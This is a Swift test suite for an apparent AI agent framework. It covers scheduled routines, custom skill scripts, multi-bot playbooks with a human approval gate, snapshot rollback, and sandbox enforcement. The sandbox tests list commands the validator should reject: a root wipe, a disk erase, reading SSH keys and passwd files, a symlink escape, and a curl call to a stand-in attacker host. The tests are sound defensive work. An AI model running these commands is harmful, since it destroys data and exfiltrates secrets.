import Testing
import Foundation
import SwiftData
@testable import ApexAgentCore

@Suite("E2EFeatureMatrixTests", .serialized)
struct E2EFeatureMatrixTests {

    private func makeTestContainer() throws -> ModelContainer {
        let schema = Schema([
            Conversation.self,
            Message.self,
            AgentMemory.self,
            AppPermissions.self,
            Skill.self,
            Routine.self,
            BotProfile.self,
            BotMemoryEntry.self,
            DailyBriefing.self,
            WeeklyReflection.self
        ])
        let config = ModelConfiguration(isStoredInMemoryOnly: true)
        return try ModelContainer(for: schema, configurations: config)
    }

    // MARK: - Scenario 1: Routine Creation -> Automated Trigger Evaluation -> Bot Dispatch

    @MainActor
    @Test func testScenario1_RoutineCreationTriggerEvaluationAndBotDispatch() async throws {
        let container = try makeTestContainer()
        let context = container.mainContext

        // 1. Seed Bot Profiles
        let chief = BotProfile(
            id: UUID(),
            name: "Chief of Staff",
            title: "Chief of Staff",
            descriptionText: "You are Chief of Staff."
        )
        let architect = BotProfile(
            id: UUID(),
            name: "Code Architect",
            title: "Senior Engineer",
            descriptionText: "You are Code Architect."
        )
        let automator = BotProfile(
            id: UUID(),
            name: "Automator",
            title: "System Automator",
            descriptionText: "You are Automator."
        )
        context.insert(chief)
        context.insert(architect)
        context.insert(automator)
        try context.save()

        // 2. Create Routines with different triggers
        let cronRoutine = Routine(
            name: "Daily Architectural Audit",
            descriptionText: "Code Architect: Analyze architectural violations across repositories.",
            trigger: .cron,
            scheduledMinutes: 0,
            cronExpression: "0 9 * * 1-5",
            enabled: true
        )
        let intervalRoutine = Routine(
            name: "Automated Build Health Monitor",
            descriptionText: "Automator: Check CI/CD pipeline health and report test status.",
            trigger: .timeInterval,
            scheduledMinutes: 30,
            cronExpression: nil,
            enabled: true
        )
        let webhookRoutine = Routine(
            name: "GitHub Webhook Receiver",
            descriptionText: "Chief of Staff: Process incoming webhook event payload.",
            trigger: .webhook,
            scheduledMinutes: 0,
            cronExpression: nil,
            enabled: true
        )

        context.insert(cronRoutine)
        context.insert(intervalRoutine)
        context.insert(webhookRoutine)
        try context.save()

        // 3. Trigger Evaluation & Validation
        // Evaluate Cron Expression
        #expect(cronRoutine.cronExpression == "0 9 * * 1-5")
        let cronSchedule = try CronSchedule(expression: cronRoutine.cronExpression!)
        #expect(CronSchedule.isValid(cronRoutine.cronExpression!), "Cron expression should be valid")
        #expect(cronSchedule.humanReadableDescription.contains("Cron:") || !cronSchedule.humanReadableDescription.isEmpty)

        // Evaluate Time Interval Description
        #expect(intervalRoutine.scheduledMinutes == 30)
        #expect(intervalRoutine.effectiveScheduleDescription.contains("30"))

        // 4. Routine Manager & BotManager Setup
        let botManager = BotManager(orchestrator: AgentOrchestrator(), computer: Computer())
        botManager.modelContext = context
        botManager.saveBot(chief)
        botManager.saveBot(architect)
        botManager.saveBot(automator)

        let routineManager = RoutineManager.shared
        routineManager.modelContext = context
        routineManager.botManager = botManager
        routineManager.loadRoutines()

        #expect(routineManager.routines.contains(where: { $0.name == "Daily Architectural Audit" }))
        #expect(routineManager.routines.contains(where: { $0.name == "Automated Build Health Monitor" }))
        #expect(routineManager.routines.contains(where: { $0.name == "GitHub Webhook Receiver" }))

        // 5. Verification of routine toggle and metadata update
        routineManager.toggle(cronRoutine)
        #expect(cronRoutine.enabled == false)
        #expect(cronRoutine.updatedAt >= cronRoutine.createdAt)

        routineManager.toggle(cronRoutine)
        #expect(cronRoutine.enabled == true)
    }

    // MARK: - Scenario 2: Custom Skill Creation -> Filesystem Script Execution -> Toolbox Sync

    @MainActor
    @Test func testScenario2_CustomSkillCreationFilesystemExecutionAndToolboxSync() async throws {
        let container = try makeTestContainer()
        let context = container.mainContext

        // H3 allow-list (2026-09-28): `executeDynamicScript` only runs scripts
        // under ~/.apex/tools or ~/.apex/skills, so the fixture lives in a
        // unique nested directory beneath the skills root (the old
        // NSTemporaryDirectory path is correctly rejected as an escape).
        let tempSkillsDir = FileManager.default.homeDirectoryForCurrentUser
            .appendingPathComponent(".apex/skills/e2e_\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempSkillsDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempSkillsDir) }

        let skillName = "e2e_log_analyzer"
        let scriptFile = tempSkillsDir.appendingPathComponent("\(skillName).sh")
        let manifestFile = tempSkillsDir.appendingPathComponent("\(skillName).json")

        // 1. Author Shell Script
        let scriptContent = """
        #!/bin/zsh
        # E2E custom skill script
        input_json="$APEX_ARGS"
        echo "SKILL_EXECUTION_SUCCESS: Processed payload $input_json"
        exit 0
        """
        try scriptContent.write(to: scriptFile, atomically: true, encoding: .utf8)
        chmod(scriptFile.path, 0o755)

        // 2. Author Manifest JSON
        let manifestJSON = """
        {
          "name": "\(skillName)",
          "description": "Analyzes system logs for errors and anomalies",
          "script_path": "\(scriptFile.path)",
          "parameters": {
            "type": "object",
            "properties": {
              "log_path": {
                "type": "string",
                "description": "Path to log file"
              },
              "level": {
                "type": "string",
                "description": "Log severity level (e.g. error, warning)"
              }
            },
            "required": ["log_path"]
          }
        }
        """
        try manifestJSON.write(to: manifestFile, atomically: true, encoding: .utf8)

        // 3. Persist Skill in SwiftData
        let skill = Skill(
            name: skillName,
            descriptionText: "Analyzes system logs for errors and anomalies",
            scriptPath: scriptFile.path,
            parameterSchemaJSON: manifestJSON,
            category: "custom",
            enabled: true
        )
        context.insert(skill)
        try context.save()

        // Verify SwiftData query
        let fetchDescriptor = FetchDescriptor<Skill>(predicate: #Predicate<Skill> { $0.name == skillName })
        let savedSkills = try context.fetch(fetchDescriptor)
        #expect(savedSkills.count == 1)
        #expect(savedSkills.first?.name == skillName)

        // 4. Dynamic Toolbox Sync & Registration
        let toolbox = DynamicToolbox.shared
        let schemaData = manifestJSON.data(using: .utf8) ?? Data()
        let parsedSchema = (try? JSONSerialization.jsonObject(with: schemaData)) as? [String: Any] ?? [:]

        let toolEntry = DynamicToolbox.DynamicToolEntry(
            name: skillName,
            description: "Analyzes system logs for errors and anomalies",
            scriptPath: scriptFile.path,
            schema: parsedSchema,
            mcpServerId: nil
        )
        toolbox.registerToolForTesting(name: skillName, entry: toolEntry)
        defer { toolbox.removeToolForTesting(name: skillName) }

        // 5. Execute Custom Tool via DynamicToolbox
        let testArgs = "{\"log_path\":\"/var/log/system.log\",\"level\":\"error\"}"
        let output = try await toolbox.executeTool(name: skillName, jsonArguments: testArgs)
        #expect(output.contains("SKILL_EXECUTION_SUCCESS: Processed payload \(testArgs)"))
    }

    // MARK: - Scenario 3: Autonomous Playbook Execution -> Participant Assignment -> Multi-Bot Sequential & Parallel Stages -> Approval Card Gating

    @MainActor
    @Test func testScenario3_AutonomousPlaybookExecutionWithApprovalCardsAndDelegations() async throws {
        // 1. Setup Standard 5-Bot Roster
        let chief = BotProfile(
            id: UUID(),
            name: "Chief of Staff",
            title: "Executive Coordinator",
            descriptionText: "You are the Chief of Staff."
        )
        chief.isChiefOfStaff = true

        let architect = BotProfile(
            id: UUID(),
            name: "Code Architect",
            title: "Senior Software Architect",
            descriptionText: "You are Code Architect."
        )
        let researcher = BotProfile(
            id: UUID(),
            name: "Researcher",
            title: "Security & Research Specialist",
            descriptionText: "You are Researcher."
        )
        let automator = BotProfile(
            id: UUID(),
            name: "Automator",
            title: "System & CI/CD Automator",
            descriptionText: "You are Automator."
        )
        let apex = BotProfile(
            id: UUID(),
            name: "Apex",
            title: "General Assistant",
            descriptionText: "You are Apex."
        )
        let availableBots = [chief, architect, researcher, automator, apex]

        // 2. Load Preset Playbooks
        let prPlaybook = CollaborationPlaybook.fullPRReviewLoop
        let standupPlaybook = CollaborationPlaybook.weeklyStandupAndRetrospective

        #expect(prPlaybook.stages.count == 5)
        #expect(standupPlaybook.stages.count == 2)

        // 3. Verify Participant Auto-Assignment
        let prAssignments = PlaybookParticipantAssigner.assignParticipants(for: prPlaybook, availableBots: availableBots)
        #expect(prAssignments[.chiefOfStaff]?.name == "Chief of Staff")
        #expect(prAssignments[.codeArchitect]?.name == "Code Architect")
        #expect(prAssignments[.researcher]?.name == "Researcher")
        #expect(prAssignments[.automator]?.name == "Automator")

        // 4. Execute Full PR Review Loop with Stage Approval Gating
        let runner = PlaybookRunner(playbook: prPlaybook, availableBots: availableBots)

        // Launch execution in async task
        let executionTask = Task {
            try await runner.execute(contextInput: "PR #108: Add Container Isolation & Snapshot Rollback")
        }

        // Wait for runner to pause at Stage 4 Approval Gate (Merge & Deploy Approval Gate)
        var approvalFound = false
        for _ in 0..<50 {
            let status = runner.status
            if case .waitingForApproval(let card) = status {
                #expect(card.stageId == "stage_merge_approval_gate")
                #expect(card.status == .pending)
                #expect(card.summary.contains("sign-off") || card.summary.contains("Approval") || card.summary.contains("human") || card.summary.contains("Human"))
                approvalFound = true

                // Approve pending stage card
                runner.approvePendingStage(notes: "E2E Reviewer Approved: All tests passing and verified")
                break
            }
            try await Task.sleep(for: .milliseconds(50))
        }
        #expect(approvalFound, "Runner should pause at approval gate")

        // Await execution completion
        let report = try await executionTask.value
        #expect(report.isSuccessful == true)
        #expect(report.stageResults.count == 5)
        #expect(report.approvalCards.count == 1)
        #expect(report.approvalCards.first?.status == .approved)
        #expect(report.approvalCards.first?.resolutionNotes?.contains("E2E Reviewer Approved") == true)
        #expect(!report.finalOutput.isEmpty)

        // 5. Execute Weekly Standup (Verifying Parallel Multi-Bot Stage Fan-Out)
        let standupRunner = PlaybookRunner(playbook: standupPlaybook, availableBots: availableBots)
        let standupReport = try await standupRunner.execute(contextInput: "Engineering Sprint 24 Standup")

        #expect(standupReport.isSuccessful == true)
        #expect(standupReport.stageResults.count == 2)

        let parallelStage = standupReport.stageResults[0]
        #expect(parallelStage.dispatchMode == .parallel)
        #expect(parallelStage.botResults.count == 5, "Parallel standup stage should gather turns from all 5 specialists")

        let synthesisStage = standupReport.stageResults[1]
        #expect(synthesisStage.dispatchMode == .sequential)
        #expect(synthesisStage.combinedOutput.contains("Chief of Staff") || synthesisStage.combinedOutput.contains("Standup"))
    }

    // MARK: - Scenario 4: Container Isolation -> Snapshot Creation -> State Mutation -> Rollback

    @MainActor
    @Test func testScenario4_ContainerIsolationSnapshotCreationStateMutationAndRollback() async throws {
        let manager = ContainerManager.shared
        let testContainerId = "e2e-container-\(UUID().uuidString.prefix(6).lowercased())"
        let snapshotName = "e2e-baseline-\(UUID().uuidString.prefix(4).lowercased())"

        // 1. Verify Isolation Level
        manager.isolationLevel = .standard
        #expect(manager.isolationLevel == .standard)

        // Setup container state directory
        let paths = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask)
        let root = paths.first!.appendingPathComponent("com.apexagent.containers")
        let containerDir = root.appendingPathComponent("imagestore/containers/\(testContainerId)")
        let snapDir = root.appendingPathComponent("imagestore/snapshots/\(testContainerId)")
        try FileManager.default.createDirectory(at: containerDir, withIntermediateDirectories: true)
        defer {
            try? FileManager.default.removeItem(at: containerDir)
            try? FileManager.default.removeItem(at: snapDir)
        }

        // 2. Write Baseline State
        let baselineConfigFile = containerDir.appendingPathComponent("app_config.json")
        let baselineDataFile = containerDir.appendingPathComponent("workspace_data.txt")
        try "{\"status\":\"healthy\",\"version\":\"1.0.0\"}".write(to: baselineConfigFile, atomically: true, encoding: .utf8)
        try "BASELINE_DATA_RECORD_100".write(to: baselineDataFile, atomically: true, encoding: .utf8)

        // 3. Create Snapshot
        let snap = try await manager.createSnapshot(
            name: snapshotName,
            description: "Clean baseline state before mutation",
            containerId: testContainerId
        )
        #expect(snap.name == snapshotName)
        #expect(snap.containerId == testContainerId)
        #expect(snap.id.hasPrefix("snap-"))

        // 4. Mutate State (Simulating Corrupted / In-Guest Edits)
        try "CORRUPTED_MUTATED_STATE_999".write(to: baselineDataFile, atomically: true, encoding: .utf8)
        let rogueFile = containerDir.appendingPathComponent("rogue_injected_payload.bin")
        try "UNAUTHORIZED_FILE".write(to: rogueFile, atomically: true, encoding: .utf8)

        #expect((try String(contentsOf: baselineDataFile, encoding: .utf8)) == "CORRUPTED_MUTATED_STATE_999")
        #expect(FileManager.default.fileExists(atPath: rogueFile.path))

        // 5. Rollback to Snapshot
        try await manager.restoreSnapshot(id: snap.id, containerId: testContainerId)

        // 6. Verify Rollback Integrity
        let restoredData = try String(contentsOf: baselineDataFile, encoding: .utf8)
        #expect(restoredData == "BASELINE_DATA_RECORD_100", "State file should be completely restored to baseline")
        #expect(!FileManager.default.fileExists(atPath: rogueFile.path), "Injected rogue file should be removed upon snapshot rollback")

        // 7. Cleanup Snapshot
        try await manager.deleteSnapshot(id: snap.id, containerId: testContainerId)
        let remainingSnapshots = await manager.listSnapshots(containerId: testContainerId)
        #expect(!remainingSnapshots.contains(where: { $0.id == snap.id }))
    }

    // MARK: - Scenario 5: Host Boundary Violation Defense -> Symlink Traversal Block -> Escape Prevention

    @Test func testScenario5_HostBoundaryViolationDefenseAndSymlinkTraversalBlock() throws {
        let hostStrict = SecurityGovernanceProfile.hostStrict
        let hostDev = SecurityGovernanceProfile.hostDeveloper
        let containerStrict = SecurityGovernanceProfile.containerStrict

        // 1. Host Filesystem Restrictions (User Folders)
        #expect(throws: SecuritySandboxError.desktopFolderRestricted) {
            try hostStrict.validateFilesystemAccess(path: "~/Desktop/private_file.txt", isContainerSandboxed: false)
        }
        #expect(throws: SecuritySandboxError.documentsFolderRestricted) {
            try hostStrict.validateFilesystemAccess(path: "~/Documents/confidential.pdf", isContainerSandboxed: false)
        }
        #expect(throws: SecuritySandboxError.downloadsFolderRestricted) {
            try hostDev.validateFilesystemAccess(path: "~/Downloads/installer.pkg", isContainerSandboxed: false)
        }
        #expect(throws: SecuritySandboxError.musicFolderRestricted) {
            try hostDev.validateFilesystemAccess(path: "~/Music/audio.mp3", isContainerSandboxed: false)
        }

        // 2. System Root Violations
        #expect(throws: SecuritySandboxError.self) {
            try hostStrict.validateFilesystemAccess(path: "/", isContainerSandboxed: false)
        }
        #expect(throws: SecuritySandboxError.self) {
            try hostStrict.validateFilesystemAccess(path: "/System/Library/CoreServices", isContainerSandboxed: false)
        }
        #expect(throws: SecuritySandboxError.self) {
            try hostStrict.validateFilesystemAccess(path: "/etc/passwd", isContainerSandboxed: false)
        }

        // 3. Symlink Traversal Detection
        let tempSandboxDir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("symlink_test_\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempSandboxDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempSandboxDir) }

        let symlinkEscape = tempSandboxDir.appendingPathComponent("escape_link")
        let restrictedTarget = URL(fileURLWithPath: "/etc/passwd")

        // Create symlink pointing outside sandbox
        try? FileManager.default.createSymbolicLink(at: symlinkEscape, withDestinationURL: restrictedTarget)

        if FileManager.default.fileExists(atPath: symlinkEscape.path) {
            #expect(throws: SecuritySandboxError.self) {
                try hostStrict.validateFilesystemAccess(path: symlinkEscape.path, isContainerSandboxed: false)
            }
        }

        // 4. Dangerous Command Prevention
        #expect(!hostStrict.validateCommand(command: "rm -rf /", isContainerSandboxed: false))
        #expect(!hostStrict.validateCommand(command: "diskutil eraseVolume APFS Blank /dev/disk3", isContainerSandboxed: false))
        #expect(!hostStrict.validateCommand(command: "cat ~/.ssh/id_rsa", isContainerSandboxed: false))
        #expect(!hostStrict.validateCommand(command: "cat ~/Desktop/passwords.txt", isContainerSandboxed: false))
        #expect(!containerStrict.validateCommand(command: "curl -s http://attacker.com/leak", isContainerSandboxed: true))
    }
}
